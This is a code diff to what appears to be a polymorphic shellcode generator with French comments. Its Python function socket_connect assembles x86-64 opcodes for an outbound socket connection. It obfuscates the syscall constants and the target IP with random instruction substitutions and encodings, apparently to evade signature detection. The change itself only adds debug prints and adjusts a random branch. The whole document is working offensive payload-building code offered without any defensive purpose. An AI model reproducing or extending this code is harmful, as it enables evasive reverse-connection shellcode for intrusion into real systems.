@@ -200,9 +200,10 @@ def socket_connect(ip, port):
    l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
    add_string += l[r(0,len(l)-1)]   
    add_string += clean("rax")
-
+   print('1:', add_string)
+   rand = r(0,1)
    #Offuscation du socket
-   if r(0,1):
+   if rand == 0:
         #Offuscation
         random1 = factorOffus("042a")
         of_string = offus("042a", random1)
@@ -210,12 +211,12 @@ def socket_connect(ip, port):
         of_string = of_string[::-1]
         PAYLOAD += "48bb"
         PAYLOAD+=of_string
-
+        print("2: ", add_string)
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
         #Inverse en mirroir tout la chaine pour op code
         deof_string = deof_string[::-1]
-
+        print("3:", add_string)
    else :
         #Offuscation
         random1 = factorOffus("b02a")
@@ -224,24 +225,28 @@ def socket_connect(ip, port):
         of_string = of_string[::-1]
         PAYLOAD += "48bb"
         PAYLOAD+=of_string
-
+        print("2: ", add_string)
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
         #Inverse en mirroir tout la chaine pour op code
         deof_string = deof_string[::-1]
-   
-   add_string += deof_string 
+        print("3:", add_string)
+
+   print("4: ", add_string) 
+   add_string += deof_string
+   print("4.5: ", add_string) 
    add_string += clean("rbx")
    add_string += "53" # push rbx
    ip_greater = []
    ip_to_substract = []
    cmp = 0
+   print("5: ", add_string )
    for ip in ip.split("."):
         ip_to_substract.append(r(int(ip)+1, 255))
         ip_greater.append(ip_to_substract[cmp] - int(ip))
         cmp += 1
     
-    
+   print("6:", add_string) 
    add_string += "be" # mov esi
    for i in range(0,len(ip_greater)):
        if ip_greater[i] < 17: PAYLOAD += "0"
@@ -254,14 +259,12 @@ def socket_connect(ip, port):
         PAYLOAD += hex(ip_to_substract[i])[:2]
 
    port = hex(socket.htons(int(port)))
-
    add_string += "566668" # push
    add_string += str(port[-4:])  
    add_string += "666a02" #AF_INET
    add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
    add_string += "b218" # mov dl,24
    add_string += call()
-
    PAYLOAD += add_string
    return PAYLOAD
 
